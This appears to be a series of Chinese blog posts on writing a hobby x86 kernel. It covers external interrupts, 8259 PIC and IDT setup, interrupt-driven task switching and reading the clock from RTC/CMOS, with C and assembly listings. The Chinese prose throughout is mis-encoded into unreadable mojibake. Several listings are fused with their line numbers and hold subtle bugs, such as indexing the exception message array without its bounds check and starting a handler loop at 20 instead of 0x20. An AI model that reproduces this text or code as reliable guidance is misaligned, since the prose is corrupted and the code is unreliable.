äº†ï¼Œä½†æ˜¯æˆ‘æ“ä½œç³»ç»Ÿæ²¡å­¦å¥½æ€ä¹ˆåŠï¼Œèµ¶ç´§æŸ¥å¤–ä¸­æ–­æ˜¯ä¸ªå•¥ ä¸­æ–­çš„ç§ç±»æœ‰ï¼š å¼‚å¸¸ å¤–ä¸­æ–­ è½¯ä¸­æ–­ UPçš„å›¾æ€»ç»“çš„éå¸¸å¥½ åœ¨ä¸Šä¸€ç¯‡æˆ‘ä»¬å®ç°çš„æ˜¯å¼‚å¸¸ï¼Œè¿™é‡Œå®ç°çš„æ˜¯å¤–ä¸­æ–­ï¼Œæœ‰äº†å¤–ä¸­æ–­æˆ‘ä»¬å°±å¯ä»¥åšä¸€äº›è¾“å…¥äº† æ¯”å¦‚ï¼š é”®ç›˜æŒ‰ä¸‹ä¸€ä¸ªæŒ‰é’®ï¼ˆå…¶å®æ„Ÿå…´è¶£çš„è¯ä¸å¦¨å»äº†è§£äº†è§£TTY(TeleTypeWriter)ï¼‰ é”®ç›˜èŠ¯ç‰‡é€šè¿‡æ•°æ®æ€»çº¿å‘CPUä¼ é€’ä¿¡å·ï¼Œè¦æ±‚CPUæš‚åœï¼Œä»æ­»å¾ªç¯è·³å‡ºï¼ˆä¸­æ–­ï¼‰ï¼Œè½¬åˆ°æ¥å¤„ç†è¿™ä¸ªæŒ‰é’®æ‰€å‡ºå‘çš„æ—¶é—´ CPUå¤„ç†å®Œæˆåè¿”å›åŸæ¥çš„æ‰§è¡Œæµ è¿™é‡Œæç»˜ä¸€ä¸‹8086PCæœºé”®ç›˜å¤„ç†è¿‡ç¨‹ CPUä¸€ç›´åœ¨æ£€æµ‹ä¸­æ–­ é”®ç›˜æŒ‰ä¸‹ï¼Œå‘å‡ºç»ˆç«¯æ‰«æç 0x1Eï¼Œè¢«I/Oæ¥å£çš„0x60ç«¯å£ä¸Š I/Oæ¥å£è§¦å‘9å·ä¸­æ–­é€šè¿‡æ•°æ®æ€»çº¿é€åˆ°CPUçš„ä¸­æ–­é€»è¾‘ä¸­ï¼Œå¹¶ä¸”å°†ä¿¡å·é€šè¿‡æ•°æ®æ€»çº¿å‘é€åˆ°æ•°æ®ç¼“å†²å¯„å­˜å™¨ä¸­ CPUä¼šæ ¹æ®æ ‡å¿—å¯„å­˜å™¨IFä½åˆ¤æ–­ï¼Œæ˜¯1å°±å“åº”ï¼Œ0åˆ™ç­‰å¾…ï¼Œä¸­æ–­é€»è¾‘æ£€æµ‹åˆ°9å·ä¸­æ–­ï¼Œè§¦å‘9å·ä¸­æ–­å¤„ç†ç¨‹åº(è¿™ä¸ªå¤„ç†ç¨‹åºå°±æ˜¯æˆ‘ä»¬è¦å†™çš„)ï¼Œç”µè·¯çº§åˆ«çš„æ˜¯ä»CPUå†…éƒ¨å®ç°çš„ï¼Œä¿¡å·ä¼ é€’æ˜¯é€šè¿‡CPUé’ˆè„šä¼ é€’ åŒæ—¶CPUå°†é”®ç›˜ä¿¡å·0x1Eè½¬ä¸ºASCIIç 0x61 å†å°†0x1Eå’Œ0x61ç»„åˆé€åˆ°å†…å­˜-é”®ç›˜ç¼“å†²åŒºä¸­ï¼ˆASCIIåœ°ä½ï¼Œä¿¡å·é«˜ä½ï¼‰ æœ€åCPUå‘é”®ç›˜å‘é€åº”ç­”ä¿¡æ¯ æœ€å¼€å§‹çš„PS2åè®®çš„é”®ç›˜(åœ†å¤´çš„)å°±æ˜¯é€šè¿‡è¿™ç§æ–¹å¼è¿›è¡Œè¾“å…¥çš„ æ‰€ä»¥æˆ‘ä»¬éœ€è¦åšç›¸å½“å¤šçš„å…³äºç¡¬ä»¶çš„æ“ä½œï¼Œæœ‰ç‚¹åƒè®¡ç»„äº† src/include/xsys/interrupt.h å®šä¹‰äº†ä¸€äº›ä¸­æ–­ç¼–å· 1234567891011121314151617#define IRQ_CLOCK 0 // æ—¶é’Ÿ#define IRQ_KEYBOARD 1 // é”®ç›˜#define IRQ_CASCADE 2 // 8259 ä»ç‰‡æ§åˆ¶å™¨#define IRQ_SERIAL_2 3 // ä¸²å£ 2#define IRQ_SERIAL_1 4 // ä¸²å£ 1#define IRQ_PARALLEL_2 5 // å¹¶å£ 2#define IRQ_FLOPPY 6 // è½¯ç›˜æ§åˆ¶å™¨#define IRQ_PARALLEL_1 7 // å¹¶å£ 1#define IRQ_RTC 8 // å®æ—¶æ—¶é’Ÿ#define IRQ_REDIRECT 9 // é‡å®šå‘ IRQ2#define IRQ_MOUSE 12 // é¼ æ ‡#define IRQ_MATH 13 // åå¤„ç†å™¨ x87#define IRQ_HARDDISK 14 // ATA ç¡¬ç›˜ç¬¬ä¸€é€šé“#define IRQ_HARDDISK2 15 // ATA ç¡¬ç›˜ç¬¬äºŒé€šé“#define IRQ_MASTER_NR 0x20 // ä¸»ç‰‡èµ·å§‹å‘é‡å·#define IRQ_SLAVE_NR 0x28 // ä»ç‰‡èµ·å§‹å‘é‡å· src/kernel/interrupt.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142#include &lt;xsys/interrupt.h&gt;#include &lt;xsys/global.h&gt;#include &lt;xsys/debug.h&gt;#include &lt;xsys/printk.h&gt;#define LOGK(fmt, args...) DEBUGK(fmt, ##args)// #define LOGK(fmt, args...)#define ENTRY_SIZE 0x30#define PIC_M_CTRL 0x20 // ä¸»ç‰‡çš„æ§åˆ¶ç«¯å£#define PIC_M_DATA 0x21 // ä¸»ç‰‡çš„æ•°æ®ç«¯å£#define PIC_S_CTRL 0xa0 // ä»ç‰‡çš„æ§åˆ¶ç«¯å£#define PIC_S_DATA 0xa1 // ä»ç‰‡çš„æ•°æ®ç«¯å£#define PIC_EOI 0x20 // é€šçŸ¥ä¸­æ–­æ§åˆ¶å™¨ä¸­æ–­ç»“æŸgate_t idt[IDT_SIZE];pointer_t idt_ptr;handler_t handler_table[IDT_SIZE];extern handler_t handler_entry_table[ENTRY_SIZE];static char *messages[] = &#123; &quot;#DE Divide Error\\0&quot;, &quot;#DB RESERVED\\0&quot;, &quot;-- NMI Interrupt\\0&quot;, &quot;#BP Breakpoint\\0&quot;, &quot;#OF Overflow\\0&quot;, &quot;#BR BOUND Range Exceeded\\0&quot;, &quot;#UD Invalid Opcode (Undefined Opcode)\\0&quot;, &quot;#NM Device Not Available (No Math Coprocessor)\\0&quot;, &quot;#DF Double Fault\\0&quot;, &quot; Coprocessor Segment Overrun (reserved)\\0&quot;, &quot;#TS Invalid TSS\\0&quot;, &quot;#NP Segment Not Present\\0&quot;, &quot;#SS Stack-Segment Fault\\0&quot;, &quot;#GP General Protection\\0&quot;, &quot;#PF Page Fault\\0&quot;, &quot;-- (Intel reserved. Do not use.)\\0&quot;, &quot;#MF x87 FPU Floating-Point Error (Math Fault)\\0&quot;, &quot;#AC Alignment Check\\0&quot;, &quot;#MC Machine Check\\0&quot;, &quot;#XF SIMD Floating-Point Exception\\0&quot;, &quot;#VE Virtualization Exception\\0&quot;, &quot;#CP Control Protection Exception\\0&quot;,&#125;;// é€šçŸ¥ä¸­æ–­æ§åˆ¶å™¨ï¼Œä¸­æ–­å¤„ç†ç»“æŸvoid send_eoi(int vector)&#123; if (vector &gt;= 0x20 &amp;&amp; vector &lt; 0x28) &#123; outb(PIC_M_CTRL, PIC_EOI); &#125; if (vector &gt;= 0x28 &amp;&amp; vector &lt; 0x30) &#123; outb(PIC_M_CTRL, PIC_EOI); outb(PIC_S_CTRL, PIC_EOI); &#125;&#125;u32 counter = 0;void default_handler(int vector)&#123; send_eoi(vector); LOGK(&quot;[%d] default interrupt called %d...\\n&quot;, vector, counter++);&#125;void exception_handler(int vector)&#123; char *message = NULL; if (vector &lt; 22) &#123; message = messages[vector]; &#125; else &#123; message = messages[15]; &#125; printk(&quot;Exception : [0x%02X] %s \\n&quot;, vector, messages[vector]); // é˜»å¡ hang();&#125;// åˆå§‹åŒ–ä¸­æ–­æ§åˆ¶å™¨void pic_init()&#123; outb(PIC_M_CTRL, 0b00010001); // ICW1: è¾¹æ²¿è§¦å‘, çº§è” 8259, éœ€è¦ICW4. outb(PIC_M_DATA, 0x20); // ICW2: èµ·å§‹ç«¯å£å· 0x20 outb(PIC_M_DATA, 0b00000100); // ICW3: IR2æ¥ä»ç‰‡. outb(PIC_M_DATA, 0b00000001); // ICW4: 8086æ¨¡å¼, æ­£å¸¸EOI outb(PIC_S_CTRL, 0b00010001); // ICW1: è¾¹æ²¿è§¦å‘, çº§è” 8259, éœ€è¦ICW4. outb(PIC_S_DATA, 0x28); // ICW2: èµ·å§‹ç«¯å£å· 0x28 outb(PIC_S_DATA, 2); // ICW3: è®¾ç½®ä»ç‰‡è¿æ¥åˆ°ä¸»ç‰‡çš„ IR2 å¼•è„š outb(PIC_S_DATA, 0b00000001); // ICW4: 8086æ¨¡å¼, æ­£å¸¸EOI outb(PIC_M_DATA, 0b11111110); // å…³é—­æ‰€æœ‰ä¸­æ–­ outb(PIC_S_DATA, 0b11111111); // å…³é—­æ‰€æœ‰ä¸­æ–­&#125;// åˆå§‹åŒ–ä¸­æ–­æè¿°ç¬¦ï¼Œå’Œä¸­æ–­å¤„ç†å‡½æ•°æ•°ç»„void idt_init()&#123; for (size_t i = 0; i &lt; ENTRY_SIZE; i++) &#123; gate_t *gate = &amp;idt[i]; handler_t handler = handler_entry_table[i]; gate-&gt;offset0 = (u32)handler &amp; 0xffff; gate-&gt;offset1 = ((u32)handler &gt;&gt; 16) &amp; 0xffff; gate-&gt;selector = 1 &lt;&lt; 3; // ä»£ç æ®µ gate-&gt;reserved = 0; // ä¿ç•™ä¸ç”¨ gate-&gt;type = 0b1110; // ä¸­æ–­é—¨ gate-&gt;segment = 0; // ç³»ç»Ÿæ®µ gate-&gt;DPL = 0; // å†…æ ¸æ€ gate-&gt;present = 1; // æœ‰æ•ˆ &#125; for (size_t i = 0; i &lt; 0x20; i++) &#123; handler_table[i] = exception_handler; &#125; for (size_t i = 20; i &lt; ENTRY_SIZE; i++) &#123; handler_table[i] = default_handler; &#125; idt_ptr.base = (u32)idt; idt_ptr.limit = sizeof(idt) - 1; asm volatile(&quot;lidt idt_ptr\\n&quot;);&#125;void interrupt_init()&#123; pic_init(); idt_init();&#125; src/kernel/main.c 1234567891011121314151617181920void kernel_init()&#123; console_init(); gdt_init(); interrupt_init(); // task_init(); asm volatile( &quot;sti\\n&quot; &quot;movl %eax, %eax\\n&quot;); u32 counter = 0; while (true) &#123; DEBUGK(&quot;looping in kernel init %d...\\n&quot;, counter++); delay(1000000000); &#125; return;&#125; å…·ä½“æ­¥éª¤ åœ¨handler.asmä¸‹æ–­ç‚¹ ä¼šå‘ç°è°ƒç”¨ä¸­æ–­çš„æ—¶é—´éƒ½ç”¨ä¸åŒï¼Œä»asm volatile(&quot;sti\\n&quot;);ä¹‹åï¼Œä¸­æ–­åˆå§‹åŒ–å®Œæ¯•ï¼Œå¼€ä¸­æ–­ï¼Œæ ‡å¿—å¯„å­˜å™¨IFä½ç½®1ã€‚åˆ™ä¼šè°ƒç”¨ä¸­æ–­å¤„ç†å‡½æ•° æ˜¯å› ä¸ºCPUä¸€ç›´åœ¨ç›‘æµ‹ä¸­æ–­ï¼Œè€Œä¸çŸ¥é“ä¸¤ä¸ªä¸­æ–­ä¹‹é—´ç›¸éš”å¤šä¹…ï¼Œæ‰€ä»¥ä¼šè¿™æ ·ä¹±åº å‚è€ƒ https://datasheetspdf.com/datasheet/80486.html https://www.bilibili.com/video/BV14e411s7CN æ“ä½œç³»ç»Ÿå®ç°-ä»»åŠ¡ä¸­æ–­ä¸ä¸Šä¸‹æ–‡ ç»“åˆå‰é¢çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬èƒ½å¦è®©ä¸­æ–­å¸®åŠ©æˆ‘ä»¬è¿›è¡Œä»»åŠ¡çš„åˆ‡æ¢ src/kernel/task.c 1234567891011121314151617u32 _ofp thread_a()//æ ‡åŠçœç•¥æ ˆå¸§&#123; asm volatile(&quot;sti\\n&quot;);//å¼€ä¸­æ–­ while (true) &#123; printk(&quot;A&quot;); &#125;&#125;u32 _ofp thread_b()&#123; asm volatile(&quot;sti\\n&quot;);//å¼€ä¸­æ–­ while (true) &#123; printk(&quot;B&quot;); &#125;&#125; ç”±äºæˆ‘ä»¬é€šè¿‡ä¸­æ–­è¿›è¡Œä»»åŠ¡çš„åˆ‡æ¢ï¼Œæ‰€ä»¥è¦ä¿®æ”¹é»˜è®¤ä¸­æ–­å…¥å£å‡½æ•°ï¼Œç”±äºè¦ä¿å­˜ä¸Šä¸‹æ–‡ï¼Œæ‰€ä»¥exception_handleræŠ¥é”™æ˜¯è¦æ‰“å°ç›¸å…³å¯„å­˜å™¨çš„å€¼ï¼›è€Œä¸”ä¸ºäº†å®ç°æ•ˆæœè¦æ‰“å¼€ä¸­æ–­ src/kernel/interrupt.c 12345678910111213141516171819202122232425262728293031323334353637383940void default_handler(int vector)&#123; send_eoi(vector); schedule();&#125;void exception_handler( int vector, u32 edi, u32 esi, u32 ebp, u32 esp, u32 ebx, u32 edx, u32 ecx, u32 eax, u32 gs, u32 fs, u32 es, u32 ds, u32 vector0, u32 error, u32 eip, u32 cs, u32 eflags)&#123; char *message = NULL; if (vector &lt; 22) &#123; message = messages[vector]; &#125; else &#123; message = messages[15]; &#125; printk(&quot;\\nEXCEPTION : %s \\n&quot;, messages[vector]); printk(&quot; VECTOR : 0x%02X\\n&quot;, vector); printk(&quot; ERROR : 0x%08X\\n&quot;, error); printk(&quot; EFLAGS : 0x%08X\\n&quot;, eflags); printk(&quot; CS : 0x%02X\\n&quot;, cs); printk(&quot; EIP : 0x%08X\\n&quot;, eip); printk(&quot; ESP : 0x%08X\\n&quot;, esp); // é˜»å¡ hang();&#125;void pic_init()&#123; ...... outb(PIC_M_DATA, 0b11111110); // å…³é—­æ‰€æœ‰ä¸­æ–­ ......&#125; åŒæ—¶ä¸ºäº†ä¿å­˜ä¸Šä¸‹æ–‡ï¼Œè¦åœ¨ä¸­æ–­å¤„ç†æ—¶ä¿å­˜æ ˆåœ°ç›¸å…³ä¿¡æ¯å¹¶è®¾ç½®è·³è½¬ src/kernel/handler.asm 12345678910111213141516171819202122232425262728interrupt_entry: ;ä¿å­˜ä¸Šä¸‹æ–‡ push ds push es push fs push gs pusha ;æ‰¾åˆ°å‹å…¥çš„ä¸­æ–­å‘é‡ï¼ˆå› ä¸ºä¿å­˜äº†ä¸Šä¸‹æ–‡ï¼‰ mov eax, [esp + 12*4] ;ä¸­æ–­å‘é‡å¤„ç†å‡½æ•°ä¼ é€’å‚æ•° push eax ; è°ƒç”¨ä¸­æ–­å¤„ç†å‡½æ•°ï¼Œhandler_table ä¸­å­˜å‚¨äº†ä¸­æ–­å¤„ç†å‡½æ•°çš„æŒ‡é’ˆ call [handler_table + eax * 4] ; å¯¹åº” push %1ï¼Œè°ƒç”¨ç»“æŸæ¢å¤æ ˆ add esp, 4 ;å›å¤ä¸Šä¸‹æ–‡ popa pop gs pop fs pop es pop ds add esp ,8 iret è‡ªç„¶çš„main.cè¦åˆå§‹åŒ–ä»»åŠ¡æ‰è¡Œ src/kernel/main.c 12345678910111213141516extern void console_init();extern void gdt_init();extern void interrupt_init();extern void clock_init();extern void hang();void kernel_init()&#123; console_init(); gdt_init(); interrupt_init(); task_init(); asm volatile(&quot;sti&quot;); hang();&#125; æ“ä½œç³»ç»Ÿå®ç°-æ—¶é’Ÿ ä¸­æ–­å°ç»“ #æ“ä½œç³»ç»Ÿå®ç°-ä¸­æ–­ä¸ç³»ç»Ÿè°ƒç”¨ #æ“ä½œç³»ç»Ÿå®ç°-å¼‚å¸¸ #æ“ä½œç³»ç»Ÿå®ç°-å¤–ä¸­æ–­ ä¹‹å‰å·²ç»æœ‰äº†3ç¯‡ç›¸å…³çš„æ–‡ç« ï¼Œè¿™é‡Œåšä¸€ä¸ªè¾ƒä¸ºå…·ä½“çš„æ€»ç»“ ä¸­æ–­å­˜åœ¨çš„æ„ä¹‰ å¤–éƒ¨ä¿¡æ¯ä¼ é€’åˆ°CPUè¿›è¡Œå¤„ç† è·Ÿæ›´å¥½çš„åˆ©ç”¨CPUï¼šAä»»åŠ¡ç­‰å¾…è¾“å…¥è¾“å‡ºæ—¶ï¼Œä¸­æ–­åå»å¤„ç†Bä»»åŠ¡ è®¡ç®—æœºå‘ç”Ÿäº†æŸäº›å¼‚å¸¸ï¼Œéœ€è¦å¤„ç†å™¨ç«‹å³æ‰§è¡Œä¸€äº›æ“ä½œï¼šé™¤0å¼‚å¸¸ å¤–ä¸­æ–­ åœ¨8086æ—¶ä»£ï¼Œä¸­æ–­æ˜¯é€šè¿‡ä¸¤ä¸ªä¿¡å·çº¿å¼•å…¥å¤„ç†å™¨çš„ï¼š NMI(None Maskable Interruptï¼Œéå±è”½ä¸­æ–­) Intelè§„å®šï¼šåªæœ‰å­˜åœ¨è¶…è¿‡4ä¸ªæ—¶é’Ÿå‘¨æœŸçš„NMIæ‰èƒ½è¢«å¤„ç†å™¨è¯†åˆ« RAMï¼šå†…å­˜æ ¡éªŒé”™ IOCHKï¼šI/Oæ ¡éªŒé”™ INTR(Interruptï¼Œå¯å±è”½ä¸­æ–­) ä¸ªäººè®¡ç®—æœºä¸­æœ€å¸¸ç”¨çš„æ˜¯ä¸­æ–­ä»£ç†ï¼š8259èŠ¯ç‰‡ Intelå…è®¸ä½¿ç”¨256ä¸ªä¸­æ–­ï¼Œç”±å›¾å¯çŸ¥8256ç»´æŒ15ä¸ªä¸­æ–­ï¼Œå¹¶ä¸”8256ä¸­ä¸­æ–­ä¿¡å·ä¸å›ºå®šï¼Œå› æ­¤ç§°ä¸ºå¯ç¼–ç¨‹ä¸­æ–­æ§åˆ¶å™¨ï¼ˆProgrammable Inpterrupt Controllerï¼ŒPICï¼‰ åˆç”±å›¾å¯çŸ¥ï¼Œè¦å®ç°å…¨éƒ¨åŠŸèƒ½ï¼Œéœ€è¦ä¸¤å—8256è¿›è¡ŒèŠ¯ç‰‡çº§è”ã€‚ ä½¿ç”¨æ—¶é’ŸåŠŸèƒ½ï¼šä¸»ç‰‡IRQ2 ä½¿ç”¨å®æ—¶æ—¶é’Ÿï¼šä¸»ç‰‡è¿æ¥int(IRQ2)-&gt;ä»ç‰‡IRQ8-&gt;ä¸»ç‰‡IR2 æ—¶é’Ÿã€CMOSã€BCDç¼–ç  RTC ä»ç®€å•çš„æ€è·¯æ¥è¯´ï¼Œä½ åªéœ€è¦ä¸€ä¸ªå®æ—¶æ—¶é’Ÿç”µè·¯(Real Time Clockï¼ŒRTC)å’Œä¸€ä¸ªCMOSå°å—ç»„æˆçš„é™æ€å­˜å‚¨å™¨å°±å¯ä»¥å®ç°æ—¶é’Ÿçš„åŠŸèƒ½ã€‚ ä¸€èˆ¬çš„RTCæ˜¯ç”±æŒ¯è¡é¢‘ç‡ä¸º32.768kHzçš„çŸ³è‹±æ™¶ä½“æŒ¯è¡å™¨é©±åŠ¨ï¼Œåˆ†é¢‘è¿‡åè¿›è¡Œæ¯ç§’ä¸€æ¬¡çš„åˆ·æ–° CMOS åŒæ ·ä¸ºäº†èƒ½è®©å¤–éƒ¨è®¿é—®ï¼Œè¯¥ç¡¬ä»¶æœ‰ä¸¤ä¸ªç«¯å£ï¼š CMOS åœ°å€å¯„å­˜å™¨ï¼š0x70 CMOS æ•°æ®å¯„å­˜å™¨ï¼š0x71 åŒæ—¶æœ‰æ—¶é—´ä¿¡æ¯ï¼ˆï¼‰ åç§»å€¼ æ„ä¹‰ 0x1 CMOS_SECOND 0x3 CMOS_MINUTE 0x5 CMOS_HOUR 0xa CMOS_Areg 0xb CMOS_Breg 0xc CMOS_Creg 0xd CMOS_Dreg 0x80 CMOS_NMI BCD BCD(Binary Coded Decimal)æ˜¯CMOS RAMä¸­ä¿å­˜æ—¶é—´ä¿¡æ¯çš„æ ¼å¼ åŠ¨æ€æ—¶é’Ÿçš„å®ç° é™¤éæ˜¯è®¡ç®—æœºè€ƒå¤å­¦å®¶ï¼Œå¦åˆ™ç›´æ¥ä¸Šæ‰‹å¾ˆéš¾ï¼Œæ‰€ä»¥ç›´æ¥å‚(å¼€)è€ƒ(æŠ„)Linux /include/linux/time.h 1234567891011121314151617181920212223242526272829303132333435#ifndef _LINUX_TIME_H#define _LINUX_TIME_Hstruct timeval &#123; long tv_sec; /* seconds */ long tv_usec; /* microseconds */&#125;;struct timezone &#123; int tz_minuteswest; /* minutes west of Greenwich */ int tz_dsttime; /* type of dst correction */&#125;;#define NFDBITS __NFDBITS#define FD_SETSIZE __FD_SETSIZE#define FD_SET(fd,fdsetp) __FD_SET(fd,fdsetp)#define FD_CLR(fd,fdsetp) __FD_CLR(fd,fdsetp)#define FD_ISSET(fd,fdsetp) __FD_ISSET(fd,fdsetp)#define FD_ZERO(fdsetp) __FD_ZERO(fdsetp)/* * Names of the interval timers, and structure * defining a timer setting. */#define ITIMER_REAL 0#define ITIMER_VIRTUAL 1#define ITIMER_PROF 2struct itimerval &#123; struct timeval it_interval; /* timer interval */ struct timeval it_value; /* current value */&#125;;#endif è¿™ä¸ªæ˜¯Linuxæ¯”è¾ƒè€çš„ç‰ˆæœ¬ä¹‹ä¸€çš„ï¼Œæœ‰ç‚¹è¿‡æ—¶äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ä¸º src/include/xsys/time.h 123456789101112131415161718192021222324#ifndef XSYS_TIME_H#define XSYS_TIME_H#include &lt;xsys/types.h&gt;typedef struct tm&#123; int tm_sec; int tm_min; int tm_hour; int tm_mday; int tm_mon; int tm_year; int tm_wday; int tm_yday; int tm_isdst;//å¤ä»¤æ—¶æ ‡å¿—&#125;tm;void time_read_bcd(tm *time);void time_read(tm *time);time_t mktime(tm *time);#endif æ¥ç€ä¾¿æ˜¯ï¼šåˆå§‹åŒ–æ—¶é—´ src/kernel/time.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153#include &lt;xsys/time.h&gt;#include &lt;xsys/debug.h&gt;#include &lt;xsys/stdlib.h&gt;#include &lt;xsys/rtc.h&gt;#define LOGK(fmt, args...) DEBUGK(fmt, ##args)#define CMOS_ADDR 0x70 // CMOS åœ°å€å¯„å­˜å™¨#define CMOS_DATA 0x71 // CMOS æ•°æ®å¯„å­˜å™¨// ä¸‹é¢æ˜¯ CMOS ä¿¡æ¯çš„å¯„å­˜å™¨ç´¢å¼•#define CMOS_SECOND 0x00 // (0 ~ 59)#define CMOS_MINUTE 0x02 // (0 ~ 59)#define CMOS_HOUR 0x04 // (0 ~ 23)#define CMOS_WEEKDAY 0x06 // (1 ~ 7) æ˜ŸæœŸå¤© = 1ï¼Œæ˜ŸæœŸå…­ = 7#define CMOS_DAY 0x07 // (1 ~ 31)#define CMOS_MONTH 0x08 // (1 ~ 12)#define CMOS_YEAR 0x09 // (0 ~ 99)#define CMOS_CENTURY 0x32 // å¯èƒ½ä¸å­˜åœ¨#define CMOS_NMI 0x80#define MINUTE 60 // æ¯åˆ†é’Ÿçš„ç§’æ•°#define HOUR (60 * MINUTE) // æ¯å°æ—¶çš„ç§’æ•°#define DAY (24 * HOUR) // æ¯å¤©çš„ç§’æ•°#define YEAR (365 * DAY) // æ¯å¹´çš„ç§’æ•°ï¼Œä»¥ 365 å¤©ç®—// æ¯ä¸ªæœˆå¼€å§‹æ—¶çš„å·²ç»è¿‡å»å¤©æ•°static int month[13] = &#123; 0, // è¿™é‡Œå ä½ï¼Œæ²¡æœ‰ 0 æœˆï¼Œä» 1 æœˆå¼€å§‹ 0, (31), (31 + 29), (31 + 29 + 31), (31 + 29 + 31 + 30), (31 + 29 + 31 + 30 + 31), (31 + 29 + 31 + 30 + 31 + 30), (31 + 29 + 31 + 30 + 31 + 30 + 31), (31 + 29 + 31 + 30 + 31 + 30 + 31 + 31), (31 + 29 + 31 + 30 + 31 + 30 + 31 + 31 + 30), (31 + 29 + 31 + 30 + 31 + 30 + 31 + 31 + 30 + 31), (31 + 29 + 31 + 30 + 31 + 30 + 31 + 31 + 30 + 31 + 30)&#125;;time_t startup_time;int century;// è¿™é‡Œç”Ÿæˆçš„æ—¶é—´å¯èƒ½å’Œ UTC æ—¶é—´æœ‰å‡ºå…¥// ä¸ç³»ç»Ÿå…·ä½“æ—¶åŒºç›¸å…³ï¼Œä¸è¿‡ä¹Ÿä¸è¦ç´§ï¼Œé¡¶å¤šå·®å‡ ä¸ªå°æ—¶time_t mktime(tm *time)&#123; time_t res; int year; // 1970 å¹´å¼€å§‹çš„å¹´æ•° // ä¸‹é¢ä» 1900 å¹´å¼€å§‹çš„å¹´æ•°è®¡ç®— if (time-&gt;tm_year &gt;= 70) year = time-&gt;tm_year - 70; else year = time-&gt;tm_year - 70 + 100; // è¿™äº›å¹´ç»è¿‡çš„ç§’æ•°æ—¶é—´ res = YEAR * year; // å·²ç»è¿‡å»çš„é—°å¹´ï¼Œæ¯ä¸ªåŠ  1 å¤© res += DAY * ((year + 1) / 4); // å·²ç»è¿‡å®Œçš„æœˆä»½çš„æ—¶é—´ res += month[time-&gt;tm_mon] * DAY; // å¦‚æœ 2 æœˆå·²ç»è¿‡äº†ï¼Œå¹¶ä¸”å½“å‰ä¸æ˜¯é—°å¹´ï¼Œé‚£ä¹ˆå‡å»ä¸€å¤© if (time-&gt;tm_mon &gt; 2 &amp;&amp; ((year + 2) % 4)) res -= DAY; // è¿™ä¸ªæœˆå·²ç»è¿‡å»çš„å¤© res += DAY * (time-&gt;tm_mday - 1); // ä»Šå¤©è¿‡å»çš„å°æ—¶ res += HOUR * time-&gt;tm_hour; // è¿™ä¸ªå°æ—¶è¿‡å»çš„åˆ†é’Ÿ res += MINUTE * time-&gt;tm_min; // è¿™ä¸ªåˆ†é’Ÿè¿‡å»çš„ç§’ res += time-&gt;tm_sec; return res;&#125;int get_yday(tm *time)&#123; int res = month[time-&gt;tm_mon]; // å·²ç»è¿‡å»çš„æœˆçš„å¤©æ•° res += time-&gt;tm_mday; // è¿™ä¸ªæœˆè¿‡å»çš„å¤©æ•° int year; if (time-&gt;tm_year &gt;= 70) year = time-&gt;tm_year - 70; else year = time-&gt;tm_year - 70 + 100; // å¦‚æœä¸æ˜¯é—°å¹´ï¼Œå¹¶ä¸” 2 æœˆå·²ç»è¿‡å»äº†ï¼Œåˆ™å‡å»ä¸€å¤© // æ³¨ï¼š1972 å¹´æ˜¯é—°å¹´ï¼Œè¿™æ ·ç®—ä¸å¤ªç²¾ç¡®ï¼Œå¿½ç•¥äº† 100 å¹´çš„å¹³å¹´ if ((year + 2) % 4 &amp;&amp; time-&gt;tm_mon &gt; 2) &#123; res -= 1; &#125; return res;&#125;void time_read_bcd(tm *time)&#123; // CMOS çš„è®¿é—®é€Ÿåº¦å¾ˆæ…¢ã€‚ä¸ºäº†å‡å°æ—¶é—´è¯¯å·®ï¼Œåœ¨è¯»å–äº†ä¸‹é¢å¾ªç¯ä¸­æ‰€æœ‰æ•°å€¼åï¼Œ // è‹¥æ­¤æ—¶ CMOS ä¸­ç§’å€¼å‘ç”Ÿäº†å˜åŒ–ï¼Œé‚£ä¹ˆå°±é‡æ–°è¯»å–æ‰€æœ‰å€¼ã€‚ // è¿™æ ·å†…æ ¸å°±èƒ½æŠŠä¸ CMOS çš„æ—¶é—´è¯¯å·®æ§åˆ¶åœ¨ 1 ç§’ä¹‹å†…ã€‚ do &#123; time-&gt;tm_sec = cmos_read(CMOS_SECOND); time-&gt;tm_min = cmos_read(CMOS_MINUTE); time-&gt;tm_hour = cmos_read(CMOS_HOUR); time-&gt;tm_wday = cmos_read(CMOS_WEEKDAY); time-&gt;tm_mday = cmos_read(CMOS_DAY); time-&gt;tm_mon = cmos_read(CMOS_MONTH); time-&gt;tm_year = cmos_read(CMOS_YEAR); century = cmos_read(CMOS_CENTURY); &#125; while (time-&gt;tm_sec != cmos_read(CMOS_SECOND));&#125;void time_read(tm *time)&#123; time_read_bcd(time); time-&gt;tm_sec = bcd_to_bin(time-&gt;tm_sec); time-&gt;tm_min = bcd_to_bin(time-&gt;tm_min); time-&gt;tm_hour = bcd_to_bin(time-&gt;tm_hour); time-&gt;tm_wday = bcd_to_bin(time-&gt;tm_wday); time-&gt;tm_mday = bcd_to_bin(time-&gt;tm_mday); time-&gt;tm_mon = bcd_to_bin(time-&gt;tm_mon); time-&gt;tm_year = bcd_to_bin(time-&gt;tm_year); time-&gt;tm_yday = get_yday(time); time-&gt;tm_isdst = -1; century = bcd_to_bin(century);&#125;void time_init()&#123; tm time; time_read(&amp;time); startup_time = mktime(&amp;time); LOGK(&quot;startup time: %d%d-%02d-%02d %02d:%02d:%02d\\n&quot;, century, time.tm_year, time.tm_mon, time.tm_mday, time.tm_hour, time.tm_min, time.tm_sec);&#125; 12345678u8 bcd_to_bin(u8 value)&#123; return (value &amp; 0xf) + (value &gt;&gt; 4) *10;&#125;u8 bin_to_bcd(u8 value)&#123; return (value / 10)*0x10 + (value % 10);&#125; åŸºæœ¬ä¸Šå°±æ˜¯è°ƒç”¨ä¸Šè¿°æ¥å£å°±å¯ä»¥å®ç° 1234567891011121314151617extern void console_init();extern void gdt_init();extern void interrupt_init();extern void clock_init();extern void time_init();extern void rtc_init();extern void hang();void kernel_init()&#123; console_init(); gdt_init(); interrupt_init(); time_init(); asm volatile(&quot;sti&quot;); hang();&#125; makefileçš„qemué€‰é¡¹é‡Œé¢åŠ ä¸Š-rtc 